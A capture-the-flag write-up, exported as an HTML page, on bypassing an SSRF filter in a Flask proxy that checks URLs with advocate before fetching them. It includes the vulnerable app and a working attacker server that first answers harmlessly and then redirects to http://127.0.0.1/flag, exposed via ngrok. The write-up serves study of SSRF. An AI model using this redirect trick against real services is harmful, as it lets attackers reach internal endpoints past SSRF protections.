<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>super secure ssrf  proxy</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>super secure ssrf  proxy</h1><br/><p>so this was the ssrf bypassing challenge where the python based website server was running the code was quite simple whereas the solution was kinda great</p><p>the website was that it was taking the url from user and directing to the dest. by checking it safe or not</p><p></p><p>the code was:</p><p></p><p>####</p><p></p><p></p><p>from flask import Flask, request, render_template</p><p>import os</p><p>import advocate</p><p>import requests</p><p></p><p>app = Flask(__name__)</p><p></p><p></p><p>@app.route(&#39;/&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])</p><p>def index():</p><p></p><p>    if request.method == &#39;POST&#39;:</p><p>        url = request.form[&#39;url&#39;]</p><p></p><p>        # Prevent SSRF</p><p>        try:</p><p>            advocate.get(url)</p><p></p><p>        except:</p><p>            return render_template(&#39;index.html&#39;, error=f&quot;The URL you entered is dangerous and not allowed.&quot;)</p><p></p><p>        r = requests.get(url)</p><p>        return render_template(&#39;index.html&#39;, result=r.text)</p><p></p><p>    return render_template(&#39;index.html&#39;)</p><p></p><p></p><p>@app.route(&#39;/flag&#39;)</p><p>def flag():</p><p>    if request.remote_addr == &#39;127.0.0.1&#39;:</p><p>        return render_template(&#39;flag.html&#39;, FLAG=os.environ.get(&quot;FLAG&quot;))</p><p></p><p>    else:</p><p>        return render_template(&#39;forbidden.html&#39;), 403</p><p></p><p></p><p>if __name__ == &#39;__main__&#39;:</p><p>    app.run(host=&quot;0.0.0.0&quot;, port=80, threaded=True)</p><p>    </p><p></p><p>#####</p><p></p><p>as we can see that when the website was having the url just “/” at last eg: <a href="https://youtube.com/">https://youtube.com/</a></p><p>it was executing the code @app.route(&#39;/&#39;)</p><p></p><p>else the code below if “/flag”</p><p>but when we gave such thing it blocked it</p><p> also look at the code , we get the flag only when the remote address was 127.0.0.1 i.e loopback address of machine</p><p> </p><p> the tricky part of the above code was that it was checking the website itself first before redirecting it to the user</p><p> so we somehow had to give 2 website 1 good one to fool it and then other one that is ours to run back of the server</p><p> </p><p> so what we had to do was to either try a dns rebinding attack </p><p> refer: <a href="https://hong5489.github.io/2022-06-06-seetf2022/#ssrf">https://hong5489.github.io/2022-06-06-seetf2022/#ssrf</a></p><p> </p><p> or the 2nd method to port forward it to our server where we run our malicious code and that code contained the the url for it&#39;s loopback address:</p><p> </p><p> so we made our code :</p><p> ####</p><p> </p><p> from flask import Flask , redirect, request</p><p></p><p>app = Flask(__name__)</p><p>check=True;</p><p></p><p>@app.route(&quot;/&quot;)</p><p>def index():</p><p>	return &quot;&lt;a href=&#39;<a href="https://youtube.com'>youtube</a>";">https://youtube.com&#39;&gt;youtube&lt;/a&gt;&quot;;</a></p><p></p><p>@app.route(&quot;/exploit&quot;,methods=[&#39;GET&#39;,&#39;POST&#39;])</p><p>def handle():</p><p>	global check</p><p>	if check:</p><p>		check=False; # sahi req</p><p>		return &quot;beta pehli sahi thi lekin duusri?&quot;</p><p>	else:</p><p>		check=True; # malicious req</p><p>		return redirect(&quot;<a href="http://127.0.0.1/flag",">http://127.0.0.1/flag&quot;,</a> code=302)</p><p>		</p><p>####</p><p></p><p>we then used flask-run to start the server and run it whosoever requests it</p><p>see how we gave the good yt link and then we gave the second link </p><p></p><p>then we started the ngrok service for the 5000 server :</p><p> so we put the url in the website like this:</p><p> &lt;url of ngrok&gt;/exploit</p></div>
</body>
</html>
